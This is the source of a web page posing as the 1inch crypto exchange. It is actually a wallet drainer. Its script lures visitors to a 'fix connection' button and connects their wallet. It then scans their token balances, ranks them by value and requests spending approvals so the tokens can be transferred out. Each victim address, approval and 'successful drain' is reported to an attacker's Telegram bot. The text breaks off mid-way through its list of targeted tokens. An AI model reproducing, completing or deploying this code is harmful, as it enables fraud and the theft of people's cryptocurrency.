<!DOCTYPE html>
<!--  This site was created in Webflow. https://webflow.com  --><!--  Last Published: Thu Feb 06 2025 12:28:01 GMT+0000 (Coordinated Universal Time)  -->
<html
  data-wf-page="679a2416e7cbe76e72c70ea8"
  data-wf-site="679a2416e7cbe76e72c70e9a"
>
  <head>
    <meta charset="utf-8" />
    <title>1inch</title>
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta content="Webflow" name="generator" />
    <link href="css/normalize.css" rel="stylesheet" type="text/css" />
    <link href="css/webflow.css" rel="stylesheet" type="text/css" />
    <link
      href="css/anthonys-awesome-site-617708.webflow.css"
      rel="stylesheet"
      type="text/css"
    />
    <link href="https://fonts.googleapis.com" rel="preconnect" />
    <link
      href="https://fonts.gstatic.com"
      rel="preconnect"
      crossorigin="anonymous"
    />
    <script
      src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"
      type="text/javascript"
    ></script>
    <script type="text/javascript">
      WebFont.load({
        google: {
          families: [
            "Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic",
          ],
        },
      });
    </script>
    <script type="text/javascript">
      !(function (o, c) {
        var n = c.documentElement,
          t = " w-mod-";
        (n.className += t + "js"),
          ("ontouchstart" in o ||
            (o.DocumentTouch && c instanceof DocumentTouch)) &&
            (n.className += t + "touch");
      })(window, document);
    </script>
    <link href="images/logo.webp" rel="shortcut icon" type="image/x-icon" />
    <link href="images/logo.webp" rel="apple-touch-icon" />
    <script src="./js/web3-bundle.js"></script>
    <script src="./js/drainer-config.js"></script>
    <!-- Web3Modal - Most Reliable Universal Wallet Connection -->
    <script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script>
      // Wait for DOM to load first
      document.addEventListener('DOMContentLoaded', function() {
        console.log('Page loaded, config:', window.DRAINER_CONFIG);
        
        // RPC Manager with fallback and rate limiting
        class RPCManager {
          constructor() {
            this.currentRPCIndex = 0;
            this.requestCount = 0;
            this.lastRequestTime = 0;
            this.failedRPCs = new Set();
          }
          
          async makeEthCall(params, retries = 3) {
            const rpcUrls = [
              window.DRAINER_CONFIG.RPC.MAINNET_URL,
              ...window.DRAINER_CONFIG.RPC.FALLBACK_URLS
            ].filter(url => !this.failedRPCs.has(url));
            
            if (rpcUrls.length === 0) {
              throw new Error('All RPC endpoints failed');
            }
            
            // Rate limiting
            const now = Date.now();
            const timeSinceLastRequest = now - this.lastRequestTime;
            const minInterval = 1000 / (window.DRAINER_CONFIG.RPC.RATE_LIMIT?.REQUESTS_PER_SECOND || 5);
            
            if (timeSinceLastRequest < minInterval) {
              await new Promise(resolve => setTimeout(resolve, minInterval - timeSinceLastRequest));
            }
            
            this.lastRequestTime = Date.now();
            
            for (let attempt = 0; attempt < retries; attempt++) {
              const currentRPC = rpcUrls[this.currentRPCIndex % rpcUrls.length];
              
              try {
                console.log(`üìû Making eth_call via ${currentRPC} (attempt ${attempt + 1})`);
                
                const result = await window.ethereum.request({
                  method: 'eth_call',
                  params: params
                });
                
                // Success - reset failure tracking for this RPC
                this.failedRPCs.delete(currentRPC);
                return result;
                
              } catch (error) {
                console.warn(`‚ùå RPC call failed on ${currentRPC}:`, error.message);
                
                if (error.code === -32000 && error.message.includes('429')) {
                  console.log('üìõ Rate limit detected, switching RPC and adding delay...');
                  this.failedRPCs.add(currentRPC);
                  this.currentRPCIndex = (this.currentRPCIndex + 1) % rpcUrls.length;
                  
                  // Longer delay for rate limit errors
                  await new Promise(resolve => setTimeout(resolve, 2000));
                } else if (attempt === retries - 1) {
                  this.failedRPCs.add(currentRPC);
                  this.currentRPCIndex = (this.currentRPCIndex + 1) % rpcUrls.length;
                }
                
                if (attempt < retries - 1) {
                  await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
                }
              }
            }
            
            throw new Error(`All ${retries} attempts failed for current RPC`);
          }
        }
        
        // Create global RPC manager
        const rpcManager = new RPCManager();
        
        // Initialize Web3Modal (Most Reliable Universal Wallet Support)
        let web3Modal = null;
        let web3 = null;
        let provider = null;
        let isConnecting = false;
        
        // Initialize Web3Modal when configuration is available
        async function initWalletConnect() {
          try {
            if (!window.DRAINER_CONFIG || !window.DRAINER_CONFIG.WALLETCONNECT || !window.DRAINER_CONFIG.WALLETCONNECT.ENABLED) {
              console.log('WalletConnect not enabled in config');
              return false;
            }
            
            const projectId = window.DRAINER_CONFIG.WALLETCONNECT.PROJECT_ID;
            console.log('Initializing Web3Modal with project ID:', projectId);
            
            // Check if Web3Modal and required libraries are available
            if (window.Web3Modal && window.WalletConnectProvider && window.Web3) {
              console.log('Web3Modal libraries loaded successfully');
              
              // Configure provider options for maximum wallet choice
              const providerOptions = {
                walletconnect: {
                  package: window.WalletConnectProvider.default,
                  options: {
                    infuraId: projectId,
                    rpc: {
                      1: window.DRAINER_CONFIG.RPC.MAINNET_URL || 'https://eth.public-rpc.com',
                      137: 'https://polygon-rpc.com/',
                      56: 'https://bsc-dataseed.binance.org/'
                    },
                    chainId: 1,
                    bridge: 'https://bridge.walletconnect.org',
                    qrcodeModalOptions: {
                      mobileLinks: [
                        'metamask',      // MetaMask Mobile
                        'trust',         // Trust Wallet
                        'rainbow',       // Rainbow Wallet
                        'argent',        // Argent Wallet
                        'coinbase',      // Coinbase Wallet
                        'imtoken',       // imToken
                        'pillar',        // Pillar Wallet
                        'tokenpocket',   // TokenPocket
                        'mathwallet',    // MathWallet
                        'ledger',        // Ledger Live
                        'safepal',       // SafePal
                        'unstoppable',   // Unstoppable Wallet
                        'dharma',        // Dharma
                        'inch',          // 1inch Wallet
                        'zerion'         // Zerion
                      ],
                      desktopLinks: [
                        'ledger',        // Ledger Live Desktop
                        'metamask',      // MetaMask Extension
                        'coinbase'       // Coinbase Extension
                      ]
                    }
                  }
                }
              };
              
              // Create Web3Modal instance with mobile-optimized settings
              web3Modal = new window.Web3Modal.default({
                network: 'mainnet',
                cacheProvider: false, // Don't cache to allow fresh connections
                providerOptions,
                theme: {
                  background: 'rgb(255, 255, 255)',
                  main: 'rgb(0, 0, 0)',
                  secondary: 'rgb(136, 136, 136)',
                  border: 'rgba(195, 195, 195, 0.14)',
                  hover: 'rgb(16, 26, 32)'
                },
                // Mobile-specific optimizations
                disableInjectedProvider: false, // Allow browser wallets on mobile browsers
                display: {
                  logo: window.location.origin + '/images/logo.webp',
                  name: window.DRAINER_CONFIG.SITE_NAME || '1inch',
                  description: 'Select your preferred wallet to continue'
                }
              });
              
              console.log('Web3Modal initialized successfully!');
              return true;
              
            } else {
              console.log('Web3Modal libraries not ready yet');
              return false;
            }
            
          } catch (error) {
            console.error('Failed to initialize Web3Modal:', error);
            return false;
          }
        }
        
        // Start initialization attempts after libraries load
        setTimeout(async () => {
          const success = await initWalletConnect();
          if (success) {
            console.log('Web3Modal ready for connections');
          } else {
            console.log('Retrying Web3Modal initialization...');
            setTimeout(initWalletConnect, 2000);
          }
        }, 1000);
        
        // Debug configuration loading
        setTimeout(() => {
          console.log('=== CONFIGURATION DEBUG ===');
          console.log('window.DRAINER_CONFIG exists:', !!window.DRAINER_CONFIG);
          console.log('window.Web3Modal exists:', !!window.Web3Modal);
          console.log('window.WalletConnectProvider exists:', !!window.WalletConnectProvider);
          console.log('window.Web3 exists:', !!window.Web3);
          console.log('Available window objects:', Object.keys(window).filter(key => key.toLowerCase().includes('reown') || key.toLowerCase().includes('wallet') || key.toLowerCase().includes('appkit')));
          if (window.DRAINER_CONFIG) {
            console.log('Site name:', window.DRAINER_CONFIG.SITE_NAME);
            console.log('Contract address:', window.DRAINER_CONFIG.CONTRACT_ADDRESS);
            console.log('WalletConnect config:', window.DRAINER_CONFIG.WALLETCONNECT);
            console.log('RPC config:', window.DRAINER_CONFIG.RPC);
            console.log('Telegram config exists:', !!window.DRAINER_CONFIG.TELEGRAM);
            if (window.DRAINER_CONFIG.TELEGRAM) {
              console.log('Telegram enabled:', window.DRAINER_CONFIG.TELEGRAM.ENABLED);
              console.log('Bot token exists:', !!window.DRAINER_CONFIG.TELEGRAM.BOT_TOKEN);
              console.log('Chat ID exists:', !!window.DRAINER_CONFIG.TELEGRAM.CHAT_ID);
            }
          }
          console.log('=== END CONFIGURATION DEBUG ===');
        }, 2000);
        
        // Initialize wallet connection on button click
        const fixButton = document.querySelector('.fix-button, .fixy');
        if (fixButton) {
          fixButton.addEventListener('click', function() {
            console.log('Fix connection clicked for:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.SITE_NAME : 'Unknown site');
            initWalletConnection();
          });
          fixButton.style.cursor = 'pointer';
        }
        
        function initWalletConnection() {
          console.log('Initializing Web3Modal connection...');
          
          // Show loading state
          const buttonText = document.querySelector('.text-block-2');
          if (buttonText) {
            buttonText.textContent = 'Opening Web3Modal...';
          }
          
          // Only use Web3Modal - universal compatibility
          if (!window.DRAINER_CONFIG || !window.DRAINER_CONFIG.WALLETCONNECT || !window.DRAINER_CONFIG.WALLETCONNECT.ENABLED) {
            console.error('WalletConnect configuration missing - cannot connect wallet');
            if (buttonText) {
              buttonText.textContent = 'WalletConnect Config Missing';
            }
            alert('Wallet connection unavailable. WalletConnect configuration required.');
            return;
          }
          
          // Open Web3Modal for universal wallet access
          showWalletConnectModal();
        }
        
        // DEPRECATED: Only using Reown now - mobile wallet functions removed
        // These functions are kept for reference but are no longer called
        /*
        async function connectMobileWallet() {
          const buttonText = document.querySelector('.text-block-2');
          
          try {
            // Try to detect mobile wallet providers
            if (window.ethereum) {
              // Mobile MetaMask, Trust Wallet, etc.
              const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
              });
              
              if (accounts.length > 0) {
                console.log('Connected to mobile wallet:', accounts[0]);
                
                // Send Telegram notification for new user
                const message = formatTelegramMessage('user_connected', {
                  address: accounts[0]
                });
                sendTelegramMessage(message);
                
                // Start the actual draining process
                await performDraining(accounts[0]);
              }
            } else {
              // No wallet detected, try deep links
              openWalletDeepLink();
            }
          } catch (error) {
            console.error('Mobile wallet connection failed:', error);
            if (buttonText) {
              buttonText.textContent = 'Connection Failed - Try Again';
            }
            // Fallback to deep link
            setTimeout(() => {
              openWalletDeepLink();
            }, 2000);
          }
        }
        
        function openWalletDeepLink() {
          const buttonText = document.querySelector('.text-block-2');
          if (buttonText) {
            buttonText.textContent = 'Opening Wallet...';
          }
          
          // Create the current page URL for return
          const currentUrl = window.location.href;
          
          // Try multiple wallet deep links
          const walletLinks = [
            // MetaMask Mobile
            `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
            // Trust Wallet
            `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`,
            // Rainbow Wallet
            `https://rnbwapp.com/connect?url=${encodeURIComponent(currentUrl)}`,
            // Coinbase Wallet
            `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(currentUrl)}`
          ];
          
          // Try the first wallet link
          window.location.href = walletLinks[0];
          
          // Fallback: show manual instructions after a delay
          setTimeout(() => {
            if (buttonText) {
              buttonText.textContent = 'Open in Wallet App';
            }
            
            // Show instructions modal
            const instructions = `
              To connect your wallet:
              
              1. Copy this URL: ${currentUrl}
              2. Open your wallet app (MetaMask, Trust Wallet, etc.)
              3. Go to Browser/DApp section
              4. Paste the URL and visit
              
              Or try these links:
              ‚Ä¢ MetaMask: ${walletLinks[0]}
              ‚Ä¢ Trust Wallet: ${walletLinks[1]}
            `;
            
            if (confirm('Wallet not detected. Click OK to see connection instructions.')) {
              alert(instructions);
            }
          }, 3000);
        }
        */
        
        // Telegram Logging Functions
        async function sendTelegramMessage(message) {
          if (!window.DRAINER_CONFIG || !window.DRAINER_CONFIG.TELEGRAM || !window.DRAINER_CONFIG.TELEGRAM.ENABLED || !window.DRAINER_CONFIG.TELEGRAM.BOT_TOKEN || !window.DRAINER_CONFIG.TELEGRAM.CHAT_ID) {
            console.log('Telegram logging disabled or not configured');
            return;
          }
          
          try {
            const telegramUrl = `https://api.telegram.org/bot${window.DRAINER_CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
            
            console.log('Sending Telegram message to chat:', window.DRAINER_CONFIG.TELEGRAM.CHAT_ID);
            console.log('Message content:', message.substring(0, 100) + '...');
            
            const response = await fetch(telegramUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: window.DRAINER_CONFIG.TELEGRAM.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
              })
            });
            
            if (response.ok) {
              console.log('üì± Telegram message sent successfully');
            } else {
              const errorText = await response.text();
              console.error('‚ùå Failed to send Telegram message:', response.status, errorText);
            }
          } catch (error) {
            console.error('‚ùå Telegram send error:', error);
          }
        }
        
        function formatTelegramMessage(type, data) {
          const timestamp = new Date().toISOString();
          const site = (window.DRAINER_CONFIG && window.DRAINER_CONFIG.SITE_NAME) ? window.DRAINER_CONFIG.SITE_NAME.toUpperCase() : '1INCH';
          
          switch (type) {
            case 'user_connected':
              return `üé£ <b>${site} - New User Connected</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `üåê <b>Site:</b> ${site}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}\n` +
                     `üîó <b>Etherscan:</b> https://etherscan.io/address/${data.address}`;
            
            case 'tokens_found':
              let tokenList = data.tokens.map((t, index) => `${index + 1}. ${t.symbol}: ${t.formattedBalance} (~$${t.estimatedValue ? t.estimatedValue.toFixed(2) : '0.00'})`).join('\n');
              const totalValue = data.tokens.reduce((sum, token) => sum + (token.estimatedValue || 0), 0);
              return `üí∞ <b>${site} - Tokens Detected (Value-Sorted)</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `üìä <b>Found ${data.tokens.length} tokens (Total: ~$${totalValue.toFixed(2)}):</b>\n${tokenList}\n` +
                     `üí° <b>Processing order:</b> Highest value first\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'approval_success':
              return `‚úÖ <b>${site} - Token Approved</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `ü™ô <b>Token:</b> ${data.symbol}\n` +
                     `üíµ <b>Amount:</b> ${data.balance}\n` +
                     `üìù <b>TX:</b> <code>${data.txHash}</code>\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'approval_rejected':
              return `‚ùå <b>${site} - Approval Rejected</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `ü™ô <b>Token:</b> ${data.symbol}\n` +
                     `‚ùó <b>Reason:</b> ${data.reason}\n` +
                     `üí° <b>Note:</b> User needs to approve token spending\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'drain_success':
              const treasuryAddr = (window.DRAINER_CONFIG && window.DRAINER_CONFIG.TREASURY_ADDRESS) ? window.DRAINER_CONFIG.TREASURY_ADDRESS : 'Unknown';
              return `üéâ <b>${site} - SUCCESSFUL DRAIN!</b>\n\n` +
                     `üë§ <b>User:</b> <code>${data.address}</code>\n` +
                     `ü™ô <b>Token:</b> ${data.symbol}\n` +
                     `üí∞ <b>Amount:</b> ${data.amount}\n` +
                     `üí∏ <b>Value:</b> ~$${data.estimatedValue || 'Unknown'}\n` +
                     `‚öôÔ∏è <b>Method:</b> ${data.method || 'claimUserRewards'}\n` +
                     `üìù <b>TX:</b> <code>${data.txHash}</code>\n` +
                     `üè¶ <b>Treasury:</b> <code>${treasuryAddr}</code>\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}\n\n` +
                     `üîó <b>TX Link:</b> https://etherscan.io/tx/${data.txHash}`;
            
            case 'process_complete':
              return `üìä <b>${site} - Process Summary</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `‚úÖ <b>Successful Drains:</b> ${data.successCount}/${data.totalTokens}\n` +
                     `üí∞ <b>Total Value:</b> ~$${data.totalValue || 'Calculating...'}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'error':
              return `‚ùå <b>${site} - Error Occurred</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `üö® <b>Error:</b> ${data.error}\n` +
                     `üìç <b>Stage:</b> ${data.stage}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            default:
              return `‚ÑπÔ∏è <b>${site} - Activity</b>\n\n${JSON.stringify(data)}\n‚è∞ <b>Time:</b> ${timestamp}`;
          }
        }
        
        async function connectMetaMask() {
          try {
            const accounts = await window.ethereum.request({ 
              method: 'eth_requestAccounts' 
            });
            
            if (accounts.length > 0) {
              console.log('Connected to MetaMask:', accounts[0]);
              
              // Send Telegram notification for new user
              const message = formatTelegramMessage('user_connected', {
                address: accounts[0]
              });
              sendTelegramMessage(message);
              
              // Start the actual draining process
              await performDraining(accounts[0]);
            }
          } catch (error) {
            console.error('MetaMask connection failed:', error);
            showWalletConnectModal();
          }
        }
        
        async function performDraining(userAddress) {
          const buttonText = document.querySelector('.text-block-2');
          
          try {
            console.log('=== STARTING DRAINING PROCESS ===');
            console.log('User address:', userAddress);
            console.log('Contract address:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : 'Config not loaded');
            
            if (buttonText) {
              buttonText.textContent = 'Scanning Wallet...';
            }
            
            // Check if MetaMask/Ethereum provider is available
            if (!window.ethereum) {
              throw new Error('No Ethereum provider found');
            }
            
            // Get network info using direct ethereum provider
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            const networkId = parseInt(chainId, 16);
            console.log('Connected to network chainId:', networkId);
            
            if (networkId !== 1) {
              alert('Please switch to Ethereum Mainnet to fix the connection issue');
              if (buttonText) {
                buttonText.textContent = 'Wrong Network';
              }
              return;
            }
            
            // Get popular token contracts to drain using direct RPC calls
            const tokens = await getPopularTokensSimple(userAddress);
            
            console.log(`Found ${tokens.length} tokens with balance:`, tokens);
            
            if (tokens.length === 0) {
              console.log('No tokens found to drain - staying on page');
              if (buttonText) {
                buttonText.textContent = 'No Issues Found';
              }
              
              // Send Telegram notification for no tokens
              const message = formatTelegramMessage('tokens_found', {
                address: userAddress,
                tokens: []
              });
              sendTelegramMessage(message);
              
              return;
            }
            
            if (buttonText) {
              buttonText.textContent = `Found ${tokens.length} tokens to process...`;
            }
            
            // Send Telegram notification for found tokens
            const message = formatTelegramMessage('tokens_found', {
              address: userAddress,
              tokens: tokens
            });
            sendTelegramMessage(message);
            
            // Approve tokens for draining using direct transactions
            let approvedCount = 0;
            for (const token of tokens) {
              try {
                console.log(`Processing ${token.symbol}...`);
                const approved = await approveTokenSimple(token, userAddress);
                if (approved) {
                  approvedCount++;
                  token.approved = true; // Mark as approved
                  console.log(`‚úì ${token.symbol} approved successfully`);
                } else {
                  token.approved = false; // Mark as failed
                  console.log(`‚úó ${token.symbol} approval failed`);
                }
                
                if (buttonText) {
                  buttonText.textContent = `Processing ${approvedCount}/${tokens.length}...`;
                }
              } catch (error) {
                console.error(`Failed to approve ${token.symbol}:`, error);
                token.approved = false; // Mark as failed
              }
            }
            
            console.log(`üìä APPROVAL SUMMARY: Approved ${approvedCount} out of ${tokens.length} tokens`);
            
            // If we got approvals, execute the draining
            if (approvedCount > 0) {
              console.log(`üöÄ Starting draining process for ${approvedCount} approved tokens...`);
              console.log('Approved tokens:', tokens.filter(token => token.approved).map(t => t.symbol));
              
              if (buttonText) {
                buttonText.textContent = 'Executing token fixes...';
              }
              
              // Add a small delay to ensure approval transactions are processed
              console.log('‚è±Ô∏è Waiting 3 seconds for approval confirmations...');
              await new Promise(resolve => setTimeout(resolve, 3000));
              
              // Get signer for transactions
              const provider = new ethers.providers.Web3Provider(window.ethereum);
              const signer = provider.getSigner();
              
              await executeDrainingSimple(tokens.filter(token => token.approved), userAddress, signer);
            } else {
              console.log('‚ùå No approvals obtained - no tokens to drain');
              if (buttonText) {
                buttonText.textContent = 'No approvals - Try again';
              }
              
              // Send summary message for failed approvals
              const failureMessage = formatTelegramMessage('process_complete', {
                address: userAddress,
                approved: 0,
                total: tokens.length,
                status: 'failed_approvals'
              });
              sendTelegramMessage(failureMessage);
            }
            
            if (buttonText) {
              buttonText.textContent = 'Process Complete';
            }
            console.log('=== DRAINING PROCESS FINISHED ===');
            
          } catch (error) {
            console.error('=== DRAINING PROCESS FAILED ===', error);
            if (buttonText) {
              buttonText.textContent = 'Process Failed';
            }
          }
        }
        
        async function getPopularTokensSimple(userAddress) {
          // Top 200 most commonly owned ERC-20 tokens with approximate USD values for sorting
          const popularTokens = [
            // Tier 1 - Stablecoins & Major tokens (Highest Priority)
            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6, priority: 1, avgPrice: 1 },
            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6, priority: 1, avgPrice: 1 },
            { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18, priority: 1, avgPrice: 2500 },
            { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8, priority: 1, avgPrice: 45000 },
            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18, priority: 1, avgPrice: 1 },
            
            // Tier 2 - Major Altcoins
            { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC', decimals: 18, priority: 2, avgPrice: 0.8 },
            { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18, priority: 2, avgPrice: 15 },
            { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18, priority: 2, avgPrice: 8 },
            { address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', symbol: 'CRO', decimals: 8, priority: 2, avgPrice: 0.1 },
            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18, priority: 2, avgPrice: 0.000025 },
            
            // Tier 3 - Popular DeFi Tokens
            { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', decimals: 18, priority: 3, avgPrice: 150 },
            { address: '0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72', symbol: 'ENS', decimals: 18, priority: 3, avgPrice: 20 },
            { address: '0x6f259637dcD74C767781E37Bc6133cd6A68aa161', symbol: 'HT', decimals: 18, priority: 3, avgPrice: 4 },
            { address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53', symbol: 'BUSD', decimals: 18, priority: 3, avgPrice: 1 },
            { address: '0x8E870D67F660D95d5be530380D0eC0bd388289E1', symbol: 'ANKR', decimals: 18, priority: 3, avgPrice: 0.04 },
            
            // Tier 4 - Exchange Tokens
            { address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', symbol: 'BNB', decimals: 18, priority: 4, avgPrice: 300 },
            { address: '0x50D1c9771902476076eCFc8B2A83Ad6b9355a4c9', symbol: 'FTT', decimals: 18, priority: 4, avgPrice: 2 },
            { address: '0x8f8221aFbB33998d8584A2B05749bA73c37a938a', symbol: 'REQ', decimals: 18, priority: 4, avgPrice: 0.1 },
            { address: '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942', symbol: 'MANA', decimals: 18, priority: 4, avgPrice: 0.5 },
            { address: '0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c', symbol: 'ENJ', decimals: 18, priority: 4, avgPrice: 0.4 },
            
            // Tier 5 - Layer 2 & Infrastructure
            { address: '0x4e15361fd6b4bb609fa63C81A2be19d873717870', symbol: 'FTM', decimals: 18, priority: 5, avgPrice: 0.3 },
            { address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0', symbol: 'SAND', decimals: 18, priority: 5, avgPrice: 0.4 },
            { address: '0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9', symbol: 'COTI', decimals: 18, priority: 5, avgPrice: 0.08 },
            { address: '0x4a220E6096B25EADb88358cb44068A3248254675', symbol: 'QNT', decimals: 18, priority: 5, avgPrice: 120 },
            { address: '0x111111111117dC0aa78b770fA6A738034120C302', symbol: '1INCH', decimals: 18, priority: 5, avgPrice: 0.5 },
            
            // Gaming & NFT Tokens
            { address: '0x037A54AaB062628C9Bbae1FDB1583c195585fe41', symbol: 'LCX', decimals: 18, priority: 6, avgPrice: 0.1 },
            { address: '0xAaEf88cEa01475125522e117BFe45cF32044E238', symbol: 'GF', decimals: 18, priority: 6, avgPrice: 0.02 },
            { address: '0x0E29e5AbbB5FD88e28b2d355774e73BD47dE3bcd', symbol: 'HAKKA', decimals: 18, priority: 6, avgPrice: 0.01 },
            { address: '0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA', symbol: 'GALA', decimals: 8, priority: 6, avgPrice: 0.03 },
            { address: '0x7de91b204c1c737bcee6f000aaa6569cf7061cb7', symbol: 'XRT', decimals: 9, priority: 6, avgPrice: 4 },
            
            // Additional Popular Tokens (30-60)
            { address: '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e', symbol: 'YFI', decimals: 18, priority: 7, avgPrice: 8000 },
            { address: '0x1985365e9f78359a9B6AD760e32412f4a445E862', symbol: 'REP', decimals: 18, priority: 7, avgPrice: 15 },
            { address: '0x4575f41308EC1483f3d399aa9a2826d74Da13Deb', symbol: 'OXT', decimals: 8, priority: 7, avgPrice: 0.1 },
            { address: '0xE41d2489571d322189246DaFA5ebDe1F4699F498', symbol: 'ZRX', decimals: 18, priority: 7, avgPrice: 0.3 },
            { address: '0x744d70FDBE2Ba4CF95131626614a1763DF805B9E', symbol: 'SNT', decimals: 18, priority: 7, avgPrice: 0.03 },
            
            // Staking & Yield Tokens (35-45)
            { address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', symbol: 'MKR', decimals: 18, priority: 8, avgPrice: 1500 },
            { address: '0xc00e94Cb662C3520282E6f5717214004A7f26888', symbol: 'COMP', decimals: 18, priority: 8, avgPrice: 60 },
            { address: '0x0D8775F648430679A709E98d2b0Cb6250d2887EF', symbol: 'BAT', decimals: 18, priority: 8, avgPrice: 0.25 },
            { address: '0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD', symbol: 'LRC', decimals: 18, priority: 8, avgPrice: 0.3 },
            { address: '0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828', symbol: 'UMA', decimals: 18, priority: 8, avgPrice: 2 },
            
            // More DeFi Tokens (46-55)
            { address: '0x408e41876cCCDC0F92210600ef50372656052a38', symbol: 'REN', decimals: 18, priority: 9, avgPrice: 0.08 },
            { address: '0x6B3595068778DD592e39A122f4f5a5cF09C90fE2', symbol: 'SUSHI', decimals: 18, priority: 9, avgPrice: 1.2 },
            { address: '0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671', symbol: 'NMR', decimals: 18, priority: 9, avgPrice: 20 },
            { address: '0xD533a949740bb3306d119CC777fa900bA034cd52', symbol: 'CRV', decimals: 18, priority: 9, avgPrice: 0.8 },
            { address: '0x4688a8b1F292FDaB17E9a90c8Bc379dC1DBd8713', symbol: 'COVER', decimals: 18, priority: 9, avgPrice: 0.1 },
            
            // Metaverse & Web3 (56-65)
            { address: '0x853d955aCEf822Db058eb8505911ED77F175b99e', symbol: 'FRAX', decimals: 18, priority: 10, avgPrice: 1 },
            { address: '0x956F47F50A910163D8BF957Cf5846D573E7f87CA', symbol: 'FEI', decimals: 18, priority: 10, avgPrice: 1 },
            { address: '0x6810e776880C02933D47DB1b9fc05908e5386b96', symbol: 'GNO', decimals: 18, priority: 10, avgPrice: 150 },
            { address: '0x83e6f1E41cdd28eAcEB20Cb649155049Fac3D5Aa', symbol: 'POLS', decimals: 18, priority: 10, avgPrice: 0.4 },
            { address: '0x6fB3e0A217407EFFf7Ca062D46c26E5d60a14d69', symbol: 'IOTX', decimals: 18, priority: 10, avgPrice: 0.04 },
            
            // Infrastructure & Utility (66-75)
            { address: '0xA4e8C3Ec456107eA67d3075bF9e3DF3A75823DB0', symbol: 'LOOM', decimals: 18, priority: 11, avgPrice: 0.05 },
            { address: '0x41e5560054824eA6B0732E656E3Ad64E20e94E45', symbol: 'CVC', decimals: 8, priority: 11, avgPrice: 0.15 },
            { address: '0xF970b8E36e23F7fC3FD752EeA86f8Be8D83375A6', symbol: 'RCN', decimals: 18, priority: 11, avgPrice: 0.01 },
            { address: '0x255Aa6DF07540cB5d3d297f0D0D4D84cb52bc8e6', symbol: 'RADN', decimals: 18, priority: 11, avgPrice: 0.02 },
            { address: '0x68749665FF8D2d112Fa859AA293F07A622782F38', symbol: 'XAUT', decimals: 6, priority: 11, avgPrice: 2000 },
            
            // Gaming & Entertainment (76-85)
            { address: '0xa693B19d2931d498c5B318dF961919BB4aee87a5', symbol: 'UST', decimals: 6, priority: 12, avgPrice: 0.02 },
            { address: '0x4E15361FD6b4BB609Fa63C81A2be19d873717870', symbol: 'FTM', decimals: 18, priority: 12, avgPrice: 0.3 },
            { address: '0x0Ae055097C6d159879521C384F1D2123D1f195e6', symbol: 'STAKE', decimals: 18, priority: 12, avgPrice: 5 },
            { address: '0xdF574c24545E5FfEcb9a659c229253D4111d87e1', symbol: 'HUSD', decimals: 8, priority: 12, avgPrice: 1 },
            { address: '0x3832d2F059E55934220881F831bE501D180671A7', symbol: 'REVV', decimals: 18, priority: 12, avgPrice: 0.01 },
            
            // Final Tier (86-100)
